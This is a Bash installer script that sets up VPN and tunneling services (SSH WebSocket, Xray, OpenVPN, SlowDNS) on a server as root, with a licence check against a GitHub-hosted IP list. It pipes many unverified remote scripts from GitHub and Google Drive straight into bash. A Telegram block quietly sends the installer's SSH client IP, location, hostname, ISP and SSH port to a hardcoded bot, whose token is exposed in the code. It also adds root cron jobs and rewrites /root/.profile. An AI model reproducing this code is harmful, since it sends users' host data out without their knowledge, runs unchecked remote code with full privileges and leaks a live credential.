#!/bin/bash
MYIP=$(curl -sS ipv4.icanhazip.com)
red='\e[1;31m'
green='\e[0;32m'
yell='\e[1;33m'
tyblue='\e[1;36m'
NC='\e[0m'

echo -e "Memeriksa VPS Anda..."
sleep 0.5

# Fungsi untuk memeriksa masa aktif script
CEKEXPIRED() {
    today=$(date -d "+1 day" "+%Y-%m-%d")
    Exp1=$(curl -sS https://raw.githubusercontent.com/tanilink/REGISTER/main/IPVPS | grep $MYIP | awk '{print $3}')
    if [[ $today < $Exp1 ]]; then
        echo -e "Status script aktif."
    else
        echo -e "SCRIPT ANDA EXPIRED"
        exit 0
    fi
}

# Memeriksa izin IP
IZIN=$(curl -sS https://raw.githubusercontent.com/tanilink/REGISTER/main/IPVPS | awk '{print $4}' | grep $MYIP)
if [ "$MYIP" = "$IZIN" ]; then
    echo "IZIN DI TERIMA!!"
else
    echo "Akses di tolak!! Benget sia hurung!!"
    exit 0
fi

# Konfigurasi hostname dan IP lokal
localip=$(hostname -I | cut -d\  -f1)
hst=$(hostname)
dart=$(cat /etc/hosts | grep -w "$hst" | awk '{print $2}')
if [[ "$hst" != "$dart" ]]; then
    echo "$localip $hst" >> /etc/hosts
fi

# Hapus log instalasi sebelumnya
if [ -f "/root/log-install.txt" ]; then
    rm -f /root/log-install.txt
fi

# Buat direktori dan file yang diperlukan
mkdir -p /etc/xray /etc/v2ray
touch /etc/xray/domain /etc/v2ray/domain /etc/xray/scdomain /etc/v2ray/scdomain

# Set timezone ke Asia/Jakarta
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime

# Nonaktifkan IPv6
sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1

# Install paket dasar
apt update -y
apt install -y git curl python3

echo -e "[ ${green}INFO${NC} ] Aight good ... installation file is ready"
sleep 2

# Buat direktori dan file konfigurasi IP
mkdir -p /var/lib/scrz-prem
echo "IP=" >> /var/lib/scrz-prem/ipvps.conf

# Install vnstat dan squid
apt install -y vnstat squid

# Unduh dan jalankan tools.sh
wget -q -O tools.sh https://raw.githubusercontent.com/tanilink/stunnelvpn/momok/tools.sh && chmod +x tools.sh && ./tools.sh
rm -f tools.sh

# Pilih domain
RANDOMDOMAIN="https://raw.githubusercontent.com/tanilink/stunnelvpn/momok/menu/"
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\e[44;97;1m         DOMAIN FEATURES           \e[0m"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e ""
echo -e "\e[37;1m [1]• JUST INPUT YOUR DOMAIN \e[0m"
echo -e "\e[37;1m [2]• JUST INPUT RANDOM DOMAIN \e[0m"
echo -e ""
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\e[44;93;1m        Tanilink TUNNELING          \e[0m"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo " "
read -p "Just Input 1 - 2 : " host

if [ "$host" = "1" ]; then
    echo -e "\e[33;1m PASTIKAN DOMAIN SUDAH DI POINTING KE IPVPS\e[0m"
    echo -e ""
    clear
    read -p " Just Input Domain : " pp
    echo "$pp" > /root/scdomain
    echo "$pp" > /etc/xray/scdomain
    echo "$pp" > /etc/xray/domain
    echo "$pp" > /etc/v2ray/domain
    echo "$pp" > /root/domain
    echo "IP=$pp" > /var/lib/scrz-prem/ipvps.conf
elif [ "$host" = "2" ]; then
    wget -q -O acakdomain.sh ${RANDOMDOMAIN}acakdomain.sh && chmod +x acakdomain.sh && ./acakdomain.sh
fi

# Install SSH/WS/UDP
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green      Install SSH / WS / UDP              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
curl -sS "https://raw.githubusercontent.com/tanilink/stunnelvpn/momok/menu/ssh-vpn.sh" | bash
sleep 2
wget -q -O nginx-ssl.sh https://raw.githubusercontent.com/tanilink/stunnelvpn/momok/nginx-ssl.sh && chmod +x nginx-ssl.sh && ./nginx-ssl.sh
wget -q -O demeling.sh https://raw.githubusercontent.com/tanilink/stunnelvpn/momok/demeling.sh && chmod +x demeling.sh && ./demeling.sh

# Install UDP Custom
mkdir -p /root/udp
wget -q --show-progress --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=12safUbdfI6kUEfb1MBRxlDfmV8NAaJmb' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=12safUbdfI6kUEfb1MBRxlDfmV8NAaJmb" -O /root/udp/udp-custom && rm -rf /tmp/cookies.txt
chmod +x /root/udp/udp-custom

# Download config UDP Custom
wget -q --show-progress --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1klXTiKGUd2Cs5cBnH3eK2Q1w50Yx3jbf' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1klXTiKGUd2Cs5cBnH3eK2Q1w50Yx3jbf" -O /root/udp/config.json && rm -rf /tmp/cookies.txt

# Buat service UDP Custom
cat <<EOF > /etc/systemd/system/udp-custom.service
[Unit]
Description=udp-custom by ©CyberVPN

[Service]
User=root
Type=simple
ExecStart=/root/udp/udp-custom server
WorkingDirectory=/root/udp/
Restart=always
RestartSec=2s

[Install]
WantedBy=default.target
EOF

# Start dan enable service UDP Custom
systemctl start udp-custom
systemctl enable udp-custom

# Install WebSocket
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green      Install Websocket              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
curl -sS "https://raw.githubusercontent.com/tanilink/stunnelvpn/momok/Insshws/insshws.sh" | bash

# Install Xray
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green      Install ALL XRAY               $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
curl -sS "https://raw.githubusercontent.com/tanilink/stunnelvpn/momok/menu/insray.sh" | bash

# Install SlowDNS
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green      Install slowdns               $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
wget -q -O slowdns.sh https://raw.githubusercontent.com/tanilink/stunnelvpn/momok/SLDNS/slowdns.sh && chmod +x slowdns.sh && ./slowdns.sh

# Install IPSec L2TP & SSTP
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green      Install IPSEC L2TP & SSTP               $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 1
curl -sS "https://raw.githubusercontent.com/tanilink/stunnelvpn/momok/ipsec/ipsec.sh" | bash

# Install OpenVPN
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green      Install OPENVPN             $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
wget -q -O vpn.sh https://raw.githubusercontent.com/tanilink/stunnelvpn/momok/Insshws/vpn.sh && bash vpn.sh && rm vpn.sh

# Install Dashboard
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green     Install Ui Menu Dasboard          $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
wget -q -O /usr/bin/dashboard "https://raw.githubusercontent.com/tanilink/stunnelvpn/momok/menu/dashboard.sh" && chmod +x /usr/bin/dashboard

# Notifikasi Telegram
USERID=1793095437
KEY="6947487236:AAHkuBwLi4kJj1WaxNarBaB-xBOwl_sP6PE"
TIMEOUT="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
DATE_EXEC="$(date "+%d %b %Y %H:%M")"
TMPFILE='/tmp/ipinfo-$DATE_EXEC.txt'
if [ -n "$SSH_CLIENT" ] && [ -z "$TMUX" ]; then
    IP=$(echo $SSH_CLIENT | awk '{print $1}')
    PORT=$(echo $SSH_CLIENT | awk '{print $3}')
    HOSTNAME=$(hostname -f)
    IPADDR=$(hostname -I | awk '{print $1}')
    curl http://ipinfo.io/$IP -s -o $TMPFILE
    CITY=$(cat $TMPFILE | sed -n 's/^  "city":[[:space:]]*//p' | sed 's/"//g')
    REGION=$(cat $TMPFILE | sed -n 's/^  "region":[[:space:]]*//p' | sed 's/"//g')
    COUNTRY=$(cat $TMPFILE | sed -n 's/^  "country":[[:space:]]*//p' | sed 's/"//g')
    ORG=$(cat $TMPFILE | sed -n 's/^  "org":[[:space:]]*//p' | sed 's/"//g')
    TEXT="
==============================
💥 NOTIFICATIONS INSTALLER 💥
==============================
👙Tanggal   : $DATE_EXEC
👙Domain    : $(cat /etc/xray/domain) 
👙Hostname  : $HOSTNAME 
👙Publik IP : $IPADDR 
👙IP PROV   : $IP 
👙ISP       : $ORG
👙CITY      : $CITY
👙REGIONAL  : $REGION
👙PORT SSH. : $PORT
==============================
   ✨SCRIPTED BY TANILINK✨
=============================="
    curl -s --max-time $TIMEOUT -d "chat_id=$USERID&disable_web_page_preview=1&text=$TEXT" $URL > /dev/null
    rm $TMPFILE
fi

# Setup cronjob
echo "0 5 * * * root reboot" >> /etc/crontab
echo "* * * * * root clog" >> /etc/crontab
echo "59 * * * * root pkill 'menu'" >> /etc/crontab
echo "0 1 * * * root xp" >> /etc/crontab
echo "*/5 * * * * root notramcpu" >> /etc/crontab
service cron restart

# Simpan informasi ISP
org=$(curl -s https://ipapi.co/org)
echo "$org" > /root/.isp

# Buat profile
cat> /root/.profile << END
if [ "$BASH" ]; then
    if [ -f ~/.bashrc ]; then
        . ~/.bashrc
    fi
fi
mesg n || true
clear
dashboard
END
chmod 644 /root/.profile

# Hapus file instalasi yang tidak diperlukan
rm -f /root/ins-xray.sh /root/senmenu.sh /root/setupku.sh /root/xraymode.sh /root/installer.sh /root/demeling.sh /root/arca.sh /root/scdomain /root/domain

# Tampilkan log instalasi
clear
echo "------------------------------------------------------------"
echo ""
echo "   >>> Service & Port"  | tee -a log-install.txt
echo "   - OpenSSH                 : 22, 53, 2222, 2269"  | tee -a log-install.txt
echo "   - SSH Websocket           : 80" | tee -a log-install.txt
echo "   - SSH SSL Websocket       : 443" | tee -a log-install.txt
echo "   - Stunnel5                : 222, 777" | tee -a log-install.txt
echo "   - Dropbear                : 109, 143" | tee -a log-install.txt
echo "   - Badvpn                  : 7100-7300" | tee -a log-install.txt
echo "   - Nginx                   : 81" | tee -a log-install.txt
echo "   - XRAY  Vmess TLS         : 443" | tee -a log-install.txt
echo "   - XRAY  Vmess None TLS    : 80" | tee -a log-install.txt
echo "   - XRAY  Vless TLS         : 443" | tee -a log-install.txt
echo "   - XRAY  Vless None TLS    : 80" | tee -a log-install.txt
echo "   - Trojan GRPC             : 443" | tee -a log-install.txt
echo "   - Trojan WS               : 443" | tee -a log-install.txt
echo "   - Trojan GO               : 443" | tee -a log-install.txt
echo "   - Sodosok WS/GRPC         : 443" | tee -a log-install.txt
echo "   - SLOWDNS                 : 53"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> Server Information & Other Features"  | tee -a log-install.txt
echo "   - Timezone                : Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
echo "   - Fail2Ban                : [ON]"  | tee -a log-install.txt
echo "   - Dflate                  : [ON]"  | tee -a log-install.txt
echo "   - IPtables                : [ON]"  | tee -a log-install.txt
echo "   - Auto-Reboot             : [ON]"  | tee -a log-install.txt
echo "   - IPv6                    : [OFF]"  | tee -a log-install.txt
echo "   - Autobackup Data" | tee -a log-install.txt
echo "   - AutoKill Multi Login User" | tee -a log-install.txt
echo "   - Auto Delete Expired Account" | tee -a log-install.txt
echo "   - Fully automatic script" | tee -a log-install.txt
echo "   - VPS settings" | tee -a log-install.txt
echo "   - Admin Control" | tee -a log-install.txt
echo "   - Change port" | tee -a log-install.txt
echo "   - Restore Data" | tee -a log-install.txt
echo "   - Full Orders For Various Services" | tee -a log-install.txt
echo ""
echo ""
echo ""
echo "" | tee -a log-install.txt
echo "ADIOS"
sleep 1
echo -ne "[ ${yell}WARNING${NC} ] Do you want to reboot now ? (y/n)? "
read answer
if [ "$answer" == "${answer#[Yy]}" ] ;then
    exit 0
else
    reboot
fi
